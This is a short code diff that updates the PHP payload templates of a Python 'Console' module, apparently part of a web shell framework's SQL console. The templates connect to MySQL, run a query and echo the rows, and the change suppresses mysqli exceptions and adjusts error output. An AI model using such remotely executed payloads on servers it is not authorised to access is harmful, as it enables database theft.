@@ -22,15 +22,15 @@ class Console(Module):
         self.register_vectors(
             [
                 PhpCode(
-                    """if($s=mysqli_connect('${host}','${user}','${passwd}')){$r=mysqli_query($s,'${query}');if($r){$f=mysqli_fetch_fields($r);foreach($f as $v){echo $v->name.'${linsep}';};echo '${colsep}';while($c=mysqli_fetch_row($r)){echo implode('${linsep}',$c);echo '${linsep}${colsep}';}};}echo '${errsep}'.@mysqli_connect_error().' '.@mysqli_error($s);@mysqli_close($s);""",
+                    """mysqli_report(MYSQLI_REPORT_OFF);if($s=mysqli_connect('${host}','${user}','${passwd}')){$r=mysqli_query($s,'${query}');if($r){$f=mysqli_fetch_fields($r);foreach($f as $v){echo $v->name.'${linsep}';};echo '${colsep}';while($c=mysqli_fetch_row($r)){echo implode('${linsep}',$c);echo '${linsep}${colsep}';}};echo @mysqli_error($s);@mysqli_close($s);}echo '${errsep}'.@mysqli_connect_error();""",
                     name='mysql',
                 ),
                 PhpCode(
-                    """if($s=mysqli_connect('${host}','${user}','${passwd}','${database}')){$r=mysqli_query($s,'${query}');if($r){$f=mysqli_fetch_fields($r);foreach($f as $v){echo $v->name.'${linsep}';};echo '${colsep}';while($c=mysqli_fetch_row($r)){echo implode('${linsep}',$c);echo '${linsep}${colsep}';}};}echo '${errsep}'.@mysqli_connect_error().' '.@mysqli_error($s);@mysqli_close($s);""",
+                    """mysqli_report(MYSQLI_REPORT_OFF);if($s=mysqli_connect('${host}','${user}','${passwd}','${database}')){$r=mysqli_query($s,'${query}');if($r){$f=mysqli_fetch_fields($r);foreach($f as $v){echo $v->name.'${linsep}';};echo '${colsep}';while($c=mysqli_fetch_row($r)){echo implode('${linsep}',$c);echo '${linsep}${colsep}';}};echo @mysqli_error($s);@mysqli_close($s);}echo '${errsep}'.@mysqli_connect_error();""",
                     name='mysql_database',
                 ),
                 PhpCode(
-                    """$r=mysqli_query('${query}');if($r){while($c=mysqli_fetch_row($r)){foreach($c as $key=>$value){echo $value.'${linsep}';}echo '${colsep}';}};mysqli_close();echo '${errsep}'.@mysqli_connect_error().' '.@mysqli_error();""",
+                    """mysqli_report(MYSQLI_REPORT_OFF);$r=mysqli_query('${query}');if($r){while($c=mysqli_fetch_row($r)){foreach($c as $key=>$value){echo $value.'${linsep}';}echo '${colsep}';}};mysqli_close();echo '${errsep}'.@mysqli_connect_error().' '.@mysqli_error();""",
                     name="mysql_fallback"
                 ),
                 PhpCode(
